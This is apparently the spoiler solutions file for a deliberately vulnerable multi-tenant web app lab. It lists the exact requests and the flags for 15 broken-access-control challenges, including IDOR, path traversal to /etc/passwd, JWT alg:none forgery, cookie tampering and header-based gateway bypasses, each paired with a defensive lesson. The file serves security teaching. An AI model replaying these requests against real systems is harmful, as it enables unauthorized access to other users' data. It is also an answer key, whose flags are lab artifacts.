# 🔒 SOLUTIONS — SPOILERS AHEAD

Stop. If you want to learn, work from `MISSIONS.md` first and only read the entry
you're stuck on. Examples below use the **fintech** domain (record prefix `STM`,
tenant emails `@northwind.test`). For `health` use `ENC`/`@cedar.test`, for
`ecommerce` use `ORD`/`@acme.test`. Replace `<...>` with values you observe.

All requests assume you're logged in as Alice (member) with her session cookie
(`mw_session`) attached — proxy your browser through Burp and resend from
Repeater, or use `curl -b cookies.jar`.

---

## C01 — Predictable sequential id (read another tenant's record)
Your own records are `STM-2026-0005` / `0006`. The numbering is global and
sequential across tenants, so lower numbers belong to other tenants.
```
GET /api/records/STM-2026-0001
```
→ `notes` contains `MW{idor_invoice_sequence_predictable}`.
Lesson: human-readable sequential references are guessable; the endpoint never
checks the record's `orgId` against yours.

## C02 — Chained UUID leak → profile dereference
User ids are UUIDs (unguessable). But the activity feed leaks one:
```
GET /api/activity        # find the "shared a document with your team" entry → actorId = <bob-uuid>
GET /api/users/<bob-uuid>
```
→ `profile.flag` = `MW{idor_chained_uuid_leak_profile}` (plus phone, tax id, etc.).
Lesson: "unguessable id" is not access control; the object endpoint has no authz.

## C03 — Reversible "opaque" document token
Look at your own document token on the Documents page and decode it:
```
echo <your-token> | base64 -d      # -> "doc:2"
```
It's `base64url("doc:" + N)`. Forge the previous one:
```
node -e "process.stdout.write(Buffer.from('doc:1').toString('base64url'))"
GET /api/documents/<forged-token>
```
→ body has `MW{idor_base64_document_token}`.
Lesson: encoding ≠ encryption ≠ authorization.

## C04 — Path traversal in the download endpoint
The UI downloads attachments by name. The name builds a path with no
normalisation. Cross-tenant predictable names work
(`?path=STM-2026-0001.pdf`), and you can escape the uploads dir entirely:
```
GET /api/files?path=../../../root/flag.txt
GET /api/files?path=../../../etc/passwd        # bonus, sandboxed decoy
```
→ `MW{path_traversal_arbitrary_file_read}`.
Lesson: never build filesystem paths from user input without canonicalising and
confining to a base directory.

## C05 — GraphQL resolver with no object-level authz (BOLA)
Same objects, different door. The `/graphql` endpoint requires a session but
authorizes nothing per-object, and exposes an `ssn` field the REST view hides:
```
POST /graphql
{"query":"{ user(id: \"<bob-uuid>\") { email ssn } }"}
```
→ `ssn` = `MW{graphql_missing_object_authorization}`.
Lesson: authorization must live in resolvers, not only in the REST layer.

## C06 — Write IDOR (state-changing, cross-tenant)
Reading isn't the only verb. PATCH a record you don't own:
```
PATCH /api/records/STM-2026-0002
{"status":"void"}
```
→ `meta.flag` = `MW{write_idor_cross_tenant_modify}`.
Lesson: ownership checks must cover writes, not just reads.

## C07 — Second-order IDOR (export job)
Authorization is "decided" at submit time (it isn't) and trusted at fetch. The
account number `AC-1003` is Bob's (yours is `AC-1001`; they're sequential):
```
POST /api/exports          {"accountNo":"AC-1003"}   -> {"jobId":"<id>"}
GET  /api/exports/<id>
```
→ `meta.flag` = `MW{second_order_idor_export_job}`.
Lesson: re-authorize at every step that dereferences a stored id.

## C08 — Mass assignment (vertical escalation)
The Settings form only sends `name` + `theme`, but `PATCH /api/account` copies
any field, including `orgRole`:
```
PATCH /api/account         {"orgRole":"owner"}
GET   /api/account/billing
```
→ `MW{mass_assignment_role_escalation}` (billing is owner-only).
Lesson: whitelist updatable fields; never bind request bodies straight onto
privileged attributes.

## C09 — Missing function-level authz (BFLA)
`GET /api/admin/team` is guarded (403 for members) but the audit endpoint isn't:
```
GET /api/admin/audit
```
→ a log line contains `MW{bfla_missing_authz_audit_logs}`.
Lesson: every admin function needs its own check; one guarded sibling proves
nothing about the rest.

## C10 — HTTP method-based authz bypass
`GET /api/admin/team` requires admin. The DELETE on the same resource forgot to:
```
DELETE /api/admin/team/<any-user-id>      # e.g. your own id from /api/auth/me
```
→ `MW{bfla_http_method_bypass}`.
Lesson: apply authorization to every method/verb, not just the one the UI uses.

## C11 — Trusting an unsigned client cookie
On login the server set `mw_ctx` = base64 JSON `{"theme":"light","lang":"en"}`
(readable in DevTools — it's not httpOnly and not signed). The staff back-office
trusts a `staff` field in it:
```
mw_ctx = base64( {"theme":"light","lang":"en","staff":true} )
GET /api/staff/overview      (with the tampered mw_ctx cookie)
```
→ `MW{trusting_unsigned_client_cookie}`.
Lesson: anything client-side must be signed/server-validated before it's trusted.

## C12 — JWT alg:none signature bypass (legacy API)
`GET /api/legacy/reports` wants an `auditor` bearer token and accepts the `none`
algorithm (no signature). Forge:
```
header  = base64url({"alg":"none","typ":"JWT"})
payload = base64url({"role":"auditor"})
token   = header + "." + payload + "."      # trailing dot, empty signature
GET /api/legacy/reports     Authorization: Bearer <token>
```
→ `MW{jwt_alg_none_signature_bypass}`.
Lesson: pin accepted algorithms server-side; reject `none`.

## C13 — Edge gateway bypass via X-Original-URL
Direct `GET /internal/admin/flag` → 403 (blocked at the gateway). But the
back-end honours an `X-Original-URL` override that runs after the block:
```
GET /              X-Original-URL: /internal/admin/flag
```
→ `MW{header_xoriginalurl_gateway_bypass}`.
Lesson: don't enforce access control only at a front-end proxy; back-ends must
not re-route on attacker-controlled headers.

## C14 — Referer-based access control
`POST /api/admin/branding` checks only that the `Referer` contains `/admin`:
```
POST /api/admin/branding     Referer: http://localhost:4000/admin/settings
{"color":"red"}
```
→ `MW{referer_based_access_control}`.
Lesson: Referer is attacker-controlled; never gate authorization on it.

## C15 — Multi-step process, only step 1 authorized
`POST /api/admin/promote/start` requires admin; `.../promote/confirm` doesn't
re-check. Skip straight to confirm:
```
POST /api/admin/promote/confirm     {"targetUserId":"<your-id>","role":"admin"}
```
→ `MW{multistep_process_authz_bypass}`.
Lesson: authorize every step of a workflow, not just the entry point.

---

### Defensive recap (what fixes all of this)
Centralize authorization, deny by default, check **object ownership** on every
read *and* write, whitelist mutable fields, validate/sign anything from the
client, pin JWT algorithms, and never rely on the UI, an edge proxy, the
`Referer`, or HTTP method to enforce access. This is OWASP **A01:2021 — Broken
Access Control**.
